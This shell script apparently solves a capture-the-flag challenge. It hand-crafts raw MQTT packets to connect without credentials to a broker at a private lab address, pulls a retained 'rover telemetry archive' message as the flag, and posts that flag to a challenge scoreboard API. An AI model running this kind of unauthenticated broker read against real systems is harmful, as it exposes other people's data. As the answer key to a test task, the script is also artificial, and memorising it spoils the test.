#!/bin/sh
set -eu
flag=$(python3 - <<'PY'
import socket
import struct

HOST = "172.20.0.141"
PORT = 18883
TOPIC = b"rover/telemetry/archive"


def packet(sock):
    first = sock.recv(1)
    if not first:
        raise RuntimeError("broker closed the connection")
    multiplier = 1
    remaining = 0
    while True:
        digit = sock.recv(1)
        if not digit:
            raise RuntimeError("incomplete MQTT packet")
        value = digit[0]
        remaining += (value & 127) * multiplier
        if value < 128:
            break
        multiplier *= 128
    body = bytearray()
    while len(body) < remaining:
        chunk = sock.recv(remaining - len(body))
        if not chunk:
            raise RuntimeError("incomplete MQTT packet body")
        body.extend(chunk)
    return first[0], bytes(body)


with socket.create_connection((HOST, PORT), timeout=5) as sock:
    sock.settimeout(5)
    client_id = b"rover-recovery"
    variable = b"\x00\x04MQTT\x04\x02\x00\x3c" + struct.pack("!H", len(client_id)) + client_id
    sock.sendall(b"\x10" + bytes([len(variable)]) + variable)
    kind, body = packet(sock)
    if kind >> 4 != 2 or len(body) < 2 or body[1] != 0:
        raise RuntimeError("MQTT connection was not accepted")

    request_id = 1
    subscribe_body = struct.pack("!H", request_id) + struct.pack("!H", len(TOPIC)) + TOPIC + b"\x00"
    sock.sendall(b"\x82" + bytes([len(subscribe_body)]) + subscribe_body)

    for _ in range(5):
        kind, body = packet(sock)
        if kind >> 4 != 3:
            continue
        topic_length = struct.unpack("!H", body[:2])[0]
        offset = 2 + topic_length
        qos = (kind >> 1) & 3
        if qos:
            offset += 2
        if body[2:offset - (2 if qos else 0)] != TOPIC:
            continue
        value = body[offset:]
        if not value:
            raise RuntimeError("empty telemetry record")
        print(value.decode("utf-8"), end="")
        break
    else:
        raise RuntimeError("no archived telemetry record received")
PY
)
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-e834df\",\"task_id\":\"task1\",\"flag\":\"${flag}\"}"
